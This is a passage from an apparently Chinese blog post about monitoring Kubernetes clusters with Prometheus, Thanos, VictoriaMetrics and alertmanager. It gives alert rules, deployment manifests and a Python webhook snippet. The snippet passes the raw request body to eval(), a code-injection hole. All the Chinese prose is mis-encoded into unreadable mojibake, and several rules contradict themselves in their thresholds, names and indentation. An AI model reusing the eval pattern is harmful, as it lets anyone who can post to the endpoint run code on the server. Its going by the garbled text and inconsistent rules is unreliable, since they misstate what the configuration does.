    - name: master_pod_resource_monitor
      rules:
      - alert: ä¸»èŠ‚ç‚¹PODä½¿ç”¨ç‡
        expr: sum(kube_pod_info{node=~&amp;quot;master.*&amp;quot;}) by (node) / sum(kube_node_status_capacity_pods{node=~&amp;quot;master.*&amp;quot;}) by (node)&amp;gt;0.7
        for: 1m
        labels:
          level: disaster
          service: node
        annotations:
          summary: &amp;quot;é›†ç¾¤MasterèŠ‚ç‚¹æ€»çš„PODä½¿ç”¨æ•°é‡å·²ç»è¶…è¿‡äº†70%&amp;quot;
          description: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},èŠ‚ç‚¹:{{ $labels.node }}å½“å‰å€¼ä¸º{{ $value }}!&amp;quot;     
  k8s_node_rule.yaml: |+
    groups:
    - name: K8sNodeMonitor
      rules:
      - alert: é›†ç¾¤èŠ‚ç‚¹èµ„æºç›‘æ§
        expr: kube_node_status_condition{condition=~&amp;quot;OutOfDisk|MemoryPressure|DiskPressure&amp;quot;,status!=&amp;quot;false&amp;quot;} ==1
        for: 1m
        labels:
          level: disaster
          service: node
        annotations:
          summary: &amp;quot;é›†ç¾¤èŠ‚ç‚¹å†…å­˜æˆ–ç£ç›˜èµ„æºçŸ­ç¼º&amp;quot;
          description: &amp;quot;èŠ‚ç‚¹:{{ $labels.node }},é›†ç¾¤:{{ $labels.monitor }},åŸå› :{{ $labels.condition }}&amp;quot;
      - alert: é›†ç¾¤èŠ‚ç‚¹çŠ¶æ€ç›‘æ§
        expr: sum(kube_node_status_condition{condition=&amp;quot;Ready&amp;quot;,status!=&amp;quot;true&amp;quot;})by(node)  == 1
        for: 2m
        labels:
          level: disaster
          service: node
        annotations:
          summary: &amp;quot;é›†ç¾¤èŠ‚ç‚¹çŠ¶æ€å‡ºç°é”™è¯¯&amp;quot;
          description: &amp;quot;èŠ‚ç‚¹:{{ $labels.node }},é›†ç¾¤:{{ $labels.monitor }}&amp;quot;
      - alert: é›†ç¾¤PODçŠ¶æ€ç›‘æ§
        expr: sum (kube_pod_container_status_terminated_reason{reason!~&amp;quot;Completed|Error&amp;quot;})  by (pod,reason) ==1
        for: 1m
        labels:
          level: high
          service: pod
        annotations:
          summary: &amp;quot;é›†ç¾¤podçŠ¶æ€å‡ºç°é”™è¯¯&amp;quot;
          description: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},åç§°:{{ $labels.pod }},åŸå› :{{ $labels.reason}}&amp;quot;
      - alert: é›†ç¾¤èŠ‚ç‚¹CPUä½¿ç”¨ç›‘æ§
        expr:  sum(node_load1) BY (instance) / sum(rate(node_cpu_seconds_total[1m])) BY (instance) &amp;gt; 2
        for: 5m
        labels:
          level: disaster
          service: node
        annotations:
          summary: &amp;quot;æœºå™¨å‡ºç°cpuå¹³å‡è´Ÿè½½è¿‡é«˜&amp;quot;
          description: &amp;quot;èŠ‚ç‚¹: {{ $labels.instance }}å¹³å‡æ¯æ ¸å¤§äº2&amp;quot;
      - alert: NodeMemoryOver80Percent
        expr:  (1 - avg by (instance)(node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes))* 100 &amp;gt;85
        for: 1m
        labels:
          level: disaster
          service: node
        annotations:
          summary: &amp;quot;æœºå™¨å‡ºç°å†…å­˜ä½¿ç”¨è¶…è¿‡85%&amp;quot;
          description: &amp;quot;èŠ‚ç‚¹: {{ $labels.instance }}&amp;quot;
  k8s_pod_rule.yaml: |+
    groups:
      - name: pod_status_monitor
        rules:
        - alert: podé”™è¯¯çŠ¶æ€ç›‘æ§
          expr: changes(kube_pod_status_phase{phase=~&amp;quot;Failed&amp;quot;}[5m]) &amp;gt;0
          for: 1m
          labels:
            level: high
            service: pod-failed
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }}å­˜åœ¨podçŠ¶æ€å¼‚å¸¸&amp;quot;
            description: &amp;quot;pod:{{$labels.pod}},çŠ¶æ€:{{$labels.phase}}&amp;quot;
        - alert: podå¼‚å¸¸çŠ¶æ€ç›‘æ§
          expr: sum(kube_pod_status_phase{phase=&amp;quot;Pending&amp;quot;})by(namespace,pod,phase)&amp;gt;0
          for: 3m
          labels:
            level: high
            service: pod-pending
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }}å­˜åœ¨podçŠ¶æ€peningå¼‚å¸¸è¶…10åˆ†é’Ÿ&amp;quot;
            description: &amp;quot;pod:{{$labels.pod}},çŠ¶æ€:{{$labels.phase}}&amp;quot;
        - alert: podç­‰å¾…çŠ¶æ€ç›‘æ§
          expr: sum(kube_pod_container_status_waiting_reason{reason!=&amp;quot;ContainerCreating&amp;quot;})by(namespace,pod,reason)&amp;gt;0
          for: 1m
          labels:
            level: high
            service: pod-wait
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }}å­˜åœ¨podçŠ¶æ€Waitå¼‚å¸¸è¶…5åˆ†é’Ÿ&amp;quot;
            description: &amp;quot;pod:{{$labels.pod}},çŠ¶æ€:{{$labels.reason}}&amp;quot;
        - alert: podéæ­£å¸¸çŠ¶æ€ç›‘æ§
          expr: sum(kube_pod_container_status_terminated_reason)by(namespace,pod,reason)&amp;gt;0
          for: 1m
          labels:
            level: high
            service: pod-nocom
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }}å­˜åœ¨podçŠ¶æ€Terminatedå¼‚å¸¸è¶…5åˆ†é’Ÿ&amp;quot;
            description: &amp;quot;pod:{{$labels.pod}},çŠ¶æ€:{{$labels.reason}}&amp;quot;
        - alert: podé‡å¯ç›‘æ§
          expr: changes(kube_pod_container_status_restarts_total[20m])&amp;gt;3
          for: 3m
          labels:
            level: high
            service: pod-restart
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }}å­˜åœ¨podåŠå°æ—¶ä¹‹å†…é‡å¯æ¬¡æ•°è¶…è¿‡3æ¬¡!&amp;quot;
            description: &amp;quot;pod:{{$labels.pod}}&amp;quot;
      - name: deployment_replicas_monitor
        rules:
        - alert: deploymentç›‘æ§
          expr: sum(kube_deployment_status_replicas_unavailable)by(namespace,deployment) &amp;gt;2
          for: 3m
          labels:
            level: high
            service: deployment-replicas
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},deployment:{{$labels.deployment}} å‰¯æœ¬æ•°æœªè¾¾åˆ°æœŸæœ›å€¼! &amp;quot;
            description: &amp;quot;ç©ºé—´:{{$labels.namespace}}ï¼Œå½“å‰ä¸å¯ç”¨å‰¯æœ¬:{{$value}},è¯·æ£€æŸ¥&amp;quot;
      - name: daemonset_replicas_monitor
        rules:
        - alert: Daemonsetç›‘æ§
          expr: sum(kube_daemonset_status_desired_number_scheduled - kube_daemonset_status_current_number_scheduled)by(daemonset,namespace) &amp;gt;2
          for: 3m
          labels:
            level: high
            service: daemonset
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},daemonset:{{$labels.daemonset}} å®ˆæŠ¤è¿›ç¨‹æ•°æœªè¾¾åˆ°æœŸæœ›å€¼!&amp;quot;
            description: &amp;quot;ç©ºé—´:{{$labels.namespace}},å½“å‰ä¸å¯ç”¨å‰¯æœ¬:{{$value}},è¯·æ£€æŸ¥&amp;quot;
      - name: satefulset_replicas_monitor
        rules:
        - alert: Satefulsetç›‘æ§
          expr: (kube_statefulset_replicas - kube_statefulset_status_replicas_ready) &amp;gt;2
          for: 3m
          labels:
            level: high
            service: statefulset
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},statefulset:{{$labels.statefulset}} å‰¯æœ¬æ•°æœªè¾¾åˆ°æœŸæœ›å€¼!&amp;quot;
            description: &amp;quot;ç©ºé—´:{{$labels.namespace}}ï¼Œå½“å‰ä¸å¯ç”¨å‰¯æœ¬:{{$value}},è¯·æ£€æŸ¥&amp;quot;
      - name: pvc_replicas_monitor
        rules:
        - alert: PVCç›‘æ§
          expr: kube_persistentvolumeclaim_status_phase{phase!=&amp;quot;Bound&amp;quot;} == 1
          for: 5m
          labels:
            level: high
            service: pvc
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},statefulset:{{$labels.persistentvolumeclaim}} å¼‚å¸¸æœªboundæˆåŠŸ!&amp;quot;
            description: &amp;quot;pvcå‡ºç°å¼‚å¸¸&amp;quot;
      - name: K8sClusterJob
        rules:	  
        - alert: é›†ç¾¤JOBçŠ¶æ€ç›‘æ§
          expr: sum(kube_job_status_failed{job=&amp;quot;kubernetes-service-endpoints&amp;quot;,k8s_app=&amp;quot;kube-state-metrics&amp;quot;})by(job_name) ==1
          for: 1m
          labels:
            level: disaster
            service: job
          annotations:
            summary: &amp;quot;é›†ç¾¤å­˜åœ¨æ‰§è¡Œå¤±è´¥çš„Job&amp;quot;
            description: &amp;quot;é›†ç¾¤:{{ $labels.monitor }},åç§°:{{ $labels.job_name }}&amp;quot;
      - name: pod_container_cpu_resource_monitor
        rules:
        - alert: å®¹å™¨å†…cpuå ç”¨ç›‘æ§
          expr: namespace:container_cpu_usage_seconds_total:sum_rate / sum(kube_pod_container_resource_limits_cpu_cores) by (monitor,namespace,pod_name)&amp;gt; 0.8
          for: 1m
          labels:
            level: high
            service: container_cpu
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }} å‡ºç°Pod CPUä½¿ç”¨ç‡å·²ç»è¶…è¿‡ç”³è¯·é‡çš„80%,&amp;quot;
            description: &amp;quot;namespace:{{$labels.namespace}}çš„pod:{{$labels.pod}},å½“å‰å€¼ä¸º{{ $value }}&amp;quot;
        - alert: å®¹å™¨å†…memå ç”¨ç›‘æ§
          expr: namespace:container_memory_usage_bytes:sum/ sum(kube_pod_container_resource_limits_memory_bytes)by(monitor,namespace,pod_name) &amp;gt; 0.8
          for: 2m
          labels:
            level: high
            service: container_mem
          annotations:
            summary: &amp;quot;é›†ç¾¤:{{ $labels.monitor }} å‡ºç°Pod memoryä½¿ç”¨ç‡å·²ç»è¶…è¿‡ç”³è¯·é‡çš„90%&amp;quot;
            description: &amp;quot;namespace:{{$labels.namespace}}çš„pod:{{$labels.pod}},å½“å‰å€¼ä¸º{{ $value }}&amp;quot;
        
  redis_rules.yaml: |+
    groups:
    - name: k8s_container_rule
    rules:
    - expr: sum(rate(container_cpu_usage_seconds_total[5m])) by (monitor,namespace,pod_name)
        record: namespace:container_cpu_usage_seconds_total:sum_rate
    - expr: sum(container_memory_usage_bytes{container_name=&amp;quot;POD&amp;quot;}) by (monitor,namespace,pod_name)
        record: namespace:container_memory_usage_bytes:sum
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;æ³¨æ„: å› ä¸ºç»„ä»¶éƒ½åœ¨åŒä¸€é›†ç¾¤æˆ‘ä»¬é‡‡ç”¨dnssrvçš„æ–¹å¼è¿›è¡Œå‘ç°å…¶ä»–ç»„ä»¶èŠ‚ç‚¹ï¼Œå…¶å®å¯¹äºå®¹å™¨å†…éƒ¨çš„dnssrvæ–¹ä¾¿å¾ˆå¤šï¼Œæˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€ä¸ªæ‰€éœ€è¦çš„headless service å¹¶ä¸”ä½¿ç”¨dns srvçš„è¯ï¼Œéœ€è¦è®¾ç½® clusterIP: None å³å¯.&lt;/code&gt;&lt;br&gt;
thanos-query-svc:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: v1
kind: Service
metadata:
  labels:
    app: query
  name: sidecar-query
spec:
  ports:
  - name: web
    port: 19090
    protocol: TCP
    targetPort: 19090
  selector:
    app: query
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;thanos-rule-svc:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: v1
kind: Service
metadata:
  labels:
    app: rule
  name: sidecar-rule
spec:
  clusterIP: None
  ports:
  - name: web
    port: 10902
    protocol: TCP
    targetPort: 10902
  - name: grpc
    port: 10901
    protocol: TCP
    targetPort: 10901
  selector:
    app: rule
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;prometheus+sidecar:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: v1
kind: Service
metadata:
  labels:
    app: prometheus
  name: prometheus-sidecar-svc
spec:
  clusterIP: None
  ports:
  - name: web
    port: 9090
    protocol: TCP
    targetPort: 9090
  - name: grpc
    port: 10901
    protocol: TCP
    targetPort: 10901
  selector:
    app: prometheus
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ•ˆæœå›¾:&lt;br&gt;
podæŒ‡æ ‡ç›‘æ§å¤šé›†ç¾¤ç¤ºä¾‹:&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617861801737.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç›‘æ§å‘Šè­¦è§„åˆ™ç¤ºä¾‹:&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617861838781.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Thanosé¦–é¡µ:&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617861846507.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;æ•°æ®å­˜å‚¨&#34;&gt;æ•°æ®å­˜å‚¨&lt;/h1&gt;
&lt;p&gt;å¯¹äºPrometheusçš„æ•°æ®å­˜å‚¨æˆ‘ä»¬ä¹Ÿèµ°äº†å¾ˆå¤šçš„å¼¯è·¯..&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¯¹äºå¼€å§‹æˆ‘ä»¬ä½¿ç”¨è¿‡influxdbæœ€ç»ˆå› ä¸ºé›†ç¾¤ç‰ˆé—®é¢˜æ”¾å¼ƒäº†ï¼Œä¹Ÿè¯•è¿‡é‡å†™Prometheus-adapteræ¥å…¥opentsdb,åæ¥å› ä¸ºéƒ¨åˆ†é€šé…ç¬¦ç»´æŠ¤éš¾é—®é¢˜ä¹Ÿæ”¾å¼ƒäº†(å…¶å®è¿˜æ˜¯tcollecterçš„æœé›†é—®é¢˜æ”¾å¼ƒçš„)ï¼Œæˆ‘ä»¬ä¹Ÿå°è¯•è¿‡ç”¨Thanos-store S3æ‰“å…¥cephå› ä¸ºå‰¯æœ¬é—®é¢˜æˆæœ¬å¤ªé«˜ï¼Œä¹Ÿæ‰“å…¥è¿‡é˜¿é‡Œäº‘çš„OSS,å­˜çš„å¤š ä½†æ˜¯å–æ•°æ®æˆäº†ä¸€ä¸ªé—®é¢˜ã€‚åé¢æˆ‘ä»¬è¿æ¥äº†victoriametricsï¼ŒåŸºæœ¬ä¸Šèƒ½è§£å†³æˆ‘ä»¬å¤§éƒ¨åˆ†çš„ä¸»è¦é—®é¢˜ã€‚&lt;br&gt;
æ¶æ„:&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617861859014.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;victoriametrics æœ¬èº«æ˜¯ä¸€ä¸ªæ—¶åºæ•°æ®åº“ï¼Œå¯¹äºè¿™æ ·ä¸€ä¸ªè¿œç«¯å­˜å‚¨ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å•ç‹¬ä½œä¸ºPrometheusæ•°æ®æºæŸ¥è¯¢ä½¿ç”¨ã€‚&lt;br&gt;
ä¼˜åŠ¿:&lt;br&gt;
1.å…·æœ‰è¾ƒé«˜çš„å‹ç¼©æ¯”å’Œé«˜æ€§èƒ½&lt;br&gt;
2.å¯ä»¥æä¾›å’ŒPrometheusåŒç­‰çš„æ•°æ®æºå±•ç¤º&lt;br&gt;
3.æ”¯æŒmetricsqlåŒæ—¶æŸ¥è¯¢æ—¶è¿›è¡Œç›¸åŒmeitricsæ•°æ®èšåˆ&lt;br&gt;
4.å¼€æºçš„é›†ç¾¤ç‰ˆæœ¬(ç®€ç›´æ— æ•Œ)&lt;br&gt;
å¯¹äºvictoriametricsæˆ‘ä»¬åšè¿‡ä¸€ä¸ªç®€å•çš„æµ‹è¯•ï¼Œç›¸åŒçš„æ•°æ®åœ¨å’ŒPrometheusåŸæœ‰æ•°æ®å¯¹æ¯”ä¸­&lt;br&gt;
å†…å­˜å¤§æ¦‚å‡å°‘50%ï¼ŒCPUèŠ‚çœè¶…40%ï¼Œç£ç›˜å ç”¨å‡å°‘çº¦40%.å¹¶ä¸”æˆ‘ä»¬é€šè¿‡è¿™ç§æ–¹å¼åˆ†ç¦»äº†å†™å…¥å’Œè¯»å–çš„é€šé“é¿å…äº†æ–°è€æ•°æ®å…±å­˜å†…å­˜é€ æˆçš„å¤§å†…å­˜å’ŒOOMé—®é¢˜ï¼Œä¹ŸåŒæ—¶æä¾›äº†ä¸€ä¸ªé•¿æœŸæ•°æ®å­˜å‚¨çš„æˆæœ¬æ–¹æ¡ˆ&lt;br&gt;
victoriametricséƒ¨ç½²:&lt;br&gt;
vminsertéƒ¨ç½²:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: monitor-vminsert
spec:
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      vminsert: online
  template:
    metadata:
      labels:
        vminsert: online
    spec:
      containers:
      - args:
        - -storageNode=vmstorage:8400
        image: victoriametrics/vminsert:v1.39.4-cluster
        imagePullPolicy: IfNotPresent
        name: vminsert
        ports:
        - containerPort: 8480
          name: vminsert
          protocol: TCP
      dnsPolicy: ClusterFirst
      hostNetwork: true
      nodeSelector:
        vminsert: online
      restartPolicy: Always
  updateStrategy:
    rollingUpdate:
      maxUnavailable: 1
    type: RollingUpdate
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;vmselectéƒ¨ç½²:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: monitor-vmselect
spec:
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      vmselect: online
  template:
    metadata:
      labels:
        vmselect: online
    spec:
      containers:
      - args:
        - -storageNode=vmstorage:8400
        image: victoriametrics/vmselect:v1.39.4-cluster
        imagePullPolicy: IfNotPresent
        name: vmselect
        ports:
        - containerPort: 8481
          name: vmselect
          protocol: TCP
      dnsPolicy: ClusterFirst
      hostNetwork: true
      nodeSelector:
        vmselect: online
      restartPolicy: Always
  updateStrategy:
    rollingUpdate:
      maxUnavailable: 1
    type: RollingUpdate
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;vmstorageéƒ¨ç½²:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: monitor-vmstorage
spec:
  replicas: 10
  serviceName: vmstorage
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      vmstorage: online
  template:
    metadata:
      labels:
        vmstorage: online
    spec:
      containers:
      - args:
        - --retentionPeriod=1
        - --storageDataPath=/storage
        image: victoriametrics/vmstorage:v1.39.4-cluster
        imagePullPolicy: IfNotPresent
        name: vmstorage
        ports:
        - containerPort: 8482
          name: http
          protocol: TCP
        - containerPort: 8400
          name: vminsert
          protocol: TCP
        - containerPort: 8401
          name: vmselect
          protocol: TCP
        volumeMounts:
        - mountPath: /data
          name: data
      hostNetwork: true
      nodeSelector:
        vmstorage: online
      restartPolicy: Always
      volumes:
      - hostPath:
          path: /data/vmstorage
          type: &amp;quot;&amp;quot;
        name: data
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;vmstorage-svc (æä¾›æ¥å£ä¾›æŸ¥è¯¢ã€å†™å…¥):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: v1
kind: Service
metadata:
  labels:
    vmstorage: staging
  name: vmstorage
spec:
  ports:
  - name: http
    port: 8482
    protocol: TCP
    targetPort: http
  - name: vmselect
    port: 8401
    protocol: TCP
    targetPort: vmselect
  - name: vminsert
    port: 8400
    protocol: TCP
    targetPort: vminsert
  selector:
    vmstorage: staging
  type: NodePort

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;vminsert-svc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: v1
kind: Service
metadata:
  labels:
    vminsert: online
  name: monitor-vminsert
spec:
  ports:
  - name: vminsert
    port: 8480
    protocol: TCP
    targetPort: vminsert
  selector:
    vminsert: online
  type: NodePort
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;vmselet-svc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: v1
kind: Service
metadata:
  labels:
    vmselect: online
  name: monitor-vmselect
spec:
  ports:
  - name: vmselect
    port: 8481
    protocol: TCP
    targetPort: vmselect
  selector:
    vmselect: online
  type: NodePort
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿›è¡Œéƒ¨ç½²å®Œæˆåéœ€è¦ä¿®æ”¹Prometheusé…ç½®è¿›è¡Œå†™å…¥å’ŒæŸ¥è¯¢æ”¯æŒ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    remote_write:
      - url: &amp;quot;http://vmstorage:8400/insert/0/prometheus/&amp;quot;
    remote_read:
      - url: &amp;quot;http://vmstorage:8401/select/0/prometheus&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;grafanaæ•°æ®æºé…ç½®:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;é€‰æ‹©æ•°æ®æºç±»å‹: Prometheus
http://vmstorage:8401/select/0/prometheus
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ•ˆæœå›¾:&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617861894002.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;å‘Šè­¦ä¿¡æ¯&#34;&gt;å‘Šè­¦ä¿¡æ¯&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;å‘Šè­¦è§„åˆ™éƒ½æ˜¯ç”±thanos ruleæ¨é€è‡³alertmanager&lt;/code&gt;&lt;br&gt;
å‘Šè­¦é‡‡ç”¨çš„æ—¶alertmanagerè¿›è¡Œå‘Šè­¦,åŒæ—¶æ­é…è‡ªå·±çš„å‘Šè­¦å¹³å°è¿›è¡Œå‘Šè­¦çš„åˆ†å‘.&lt;br&gt;
åœ¨é…ç½®ä¸­æˆ‘ä»¬æŒ‰ç…§alertnameå’Œmonitorè¿›è¡Œåˆ†ç»„,å¯ä»¥å®ç°ç›¸åŒalert nameä¸‹çš„æ‰€æœ‰å‘Šè­¦åˆ†æˆä¸€ä¸ªç»„ï¼Œè¿›è¡ŒåŸºäºPrometheusçš„èšåˆå‘Šè­¦ï¼ŒåŒæ—¶å› ä¸ºç°ç½‘PODè¾ƒå¤šï¼Œå¦‚å‘ç”Ÿå¤§è§„æ¨¡PODå¼‚å¸¸è¿›è¡Œèšåˆæ—¶æ•°æ®è¾ƒå¤§ï¼Œå•ç‹¬åˆ†ç±»ã€‚æ•ˆæœå¦‚åé¢å±•ç¤º&lt;br&gt;
å‘Šè­¦é™é»˜é…ç½®:å› ä¸ºç°ç½‘å‘Šè­¦éƒ½åœ¨labelä¸­å®šä¹‰äº†å‘Šè­¦çº§åˆ«(warningã€highã€disaster)çº§åˆ«,å¯¹äºæœ€ä½çº§åˆ«çš„å‘Šè­¦æˆ‘ä»¬é»˜è®¤ä¸èµ°å‘Šè­¦å¹³å°ï¼Œæ ¹æ®å‘Šè­¦çš„ç­‰çº§å’Œå‘Šè­¦è§„åˆ™è¿›è¡Œé™é»˜ã€‚&lt;br&gt;
ä¾‹:&lt;br&gt;
1.åŒmonitoré›†ç¾¤ä¸‹æŸä¸€ä¸ªalertnameæŒ‰ç…§instanceè¿›è¡Œé™é»˜ï¼Œ&lt;br&gt;
2.å¯¹äºå¤§é‡PODå‘Šè­¦æˆ‘ä»¬åŸºäºPODå‘Šè­¦ç±»å‹è¿›è¡Œé™é»˜&lt;br&gt;
ç¬¬ä¸€æ¬¡å‘Šè­¦æ—¶ä¼šæ ¹æ®åˆ†ç»„èšåˆä¿¡æ¯è¿›è¡Œæ‰€æœ‰å‘Šè­¦ä¿¡æ¯æ¨é€&lt;br&gt;
alertmanageré…ç½®:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;global:
  smtp_smarthost: &#39;mail.xxxxxxx.com:25&#39;
  smtp_from: &#39;xxxxxxx@xxxxxxx.com&#39;
  smtp_auth_username: &#39;xxxxxxx@xxxxxxx.com&#39;
  smtp_auth_password: &#39;xxxxxxx&#39;
  smtp_require_tls: false

route:
  group_by: [&#39;alertname&#39;,&#39;pod&#39;,&#39;monitor&#39;]
  group_wait: 10s
  group_interval: 10s
  repeat_interval: 6h
  receiver: &#39;webhook&#39;

  routes:
  - receiver: &#39;mail&#39;
    match:
      level: warning

receivers:
- name: &#39;mail&#39;
  email_configs:
  - to: &#39;amend@xxxxx.com,amend2@xxxxx.com&#39;
    send_resolved: true

- name: &#39;webhook&#39;
  webhook_configs:
  - url: &#39;http://alert.xxx.com/alert/prometheus&#39;
    send_resolved: true
inhibit_rules:
  - source_match:
      level: &#39;disaster&#39;
    target_match_re:
      level: &#39;high|disaster&#39;
    equal: [&#39;alertname&#39;,&#39;instance&#39;,&#39;monitor&#39;]
  - source_match:
      level: &#39;high&#39;
    target_match_re:
      level: &#39;high&#39;
    equal: [&#39;alertname&#39;,&#39;instance&#39;,&#39;monitor&#39;]

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‘Šè­¦èšåˆä»£ç ç¤ºä¾‹(python):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;        try:
            payload = eval(self.request.body)
        except json.decoder.JSONDecodeError:
            raise web.HTTPError(400)
        alert_row = payload[&#39;alerts&#39;]
        try:
            if len(alert_row) &amp;lt;2:
               description =  alert_row[0][&#39;annotations&#39;][&#39;description&#39;]
               summary =  alert_row[0][&#39;annotations&#39;][&#39;summary&#39;]
            else:
               for alert in alert_row:
                   description +=  alert[&#39;annotations&#39;][&#39;description&#39;] + &#39;\n&#39;
               summary = &#39;[èšåˆå‘Šè­¦] &#39;+ alert_row[0][&#39;annotations&#39;][&#39;summary&#39;]
        except:
            pass
        try:
            namespace =  alert_row[0][&#39;labels&#39;][&#39;namespace&#39;]
        except:
            pass

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ•ˆæœ:&lt;br&gt;
1.å¯¹äºPODçš„ç›‘æ§&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617861923719.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2.å¯¹äºinstanceçº§åˆ«å‘Šè­¦&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617861946897.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
3.å¯¹äºä¸šåŠ¡çº§åˆ«å‘Šè­¦&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617861956813.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æºç å’Œæ¨¡æ¿:&lt;br&gt;
https://github.com/gecailong/K8sMonitor&lt;/p&gt;
&lt;p&gt;å‚è€ƒ:&lt;br&gt;
https://github.com/thanos-io/thanos&lt;br&gt;
https://github.com/VictoriaMetrics/VictoriaMetrics&lt;br&gt;
https://github.com/gecailong/K8sMonitor&lt;br&gt;
https://blog.csdn.net/liukuan73/article/details/78881008&lt;/p&gt;
">å¦‚ä½•ç”¨åŸç”ŸPrometheusç›‘æ§å¤§è§„æ¨¡Kubernetesé›†ç¾¤</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://amendge.github.io/post/ru-he-zhen-dui-gao-xie-ru-di-cha-xun-es-ji-qun-you-hua/"" data-c="
          &lt;p&gt;é’ˆå¯¹é«˜å¹¶å‘å†™å…¥çš„æ—¥å¿—é›†ç¾¤ã€å‘Šè­¦é›†ç¾¤åšä»æ—¥å¿—å†™å…¥ã€å¤„ç†ã€é›†ç¾¤ä¼˜åŒ–æé«˜å†™å…¥ååé‡&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;æ¦‚è¿°:ELKç°åœ¨å·²ç»æˆä¸ºå¤§å¤šæ•°å…¬å¸ä½œä¸ºæ—¥å¿—å­˜å‚¨ã€å‘Šè­¦çš„é€šç”¨è§£å†³æ–¹æ¡ˆ,ç›®å‰æˆ‘ä»¬ç°ç½‘é™¤äº†ä¸šåŠ¡æ—¥å¿—èµ°å¤§æ•°æ®ä¹‹å¤–ï¼Œå…¶ä»–ç»„ä»¶å†…éƒ¨æ”¯æŒçš†ä¸ºelkå­˜å‚¨å‘Šè­¦.&lt;br&gt;
é›†ç¾¤è§„æ¨¡:&lt;br&gt;
esé›†ç¾¤ä¸º 28èŠ‚ç‚¹ æ¯ä¸ªèŠ‚ç‚¹5.5Tç›˜æœºæ¢°ç¡¬ç›˜ å­˜å‚¨æ•°æ®çº¦7å¤©/55T å†™å…¥çº¦12w/s&lt;/p&gt;
&lt;h1 id=&#34;é«˜å†™å…¥ä½æŸ¥è¯¢é›†ç¾¤&#34;&gt;é«˜å†™å…¥ä½æŸ¥è¯¢é›†ç¾¤:&lt;/h1&gt;
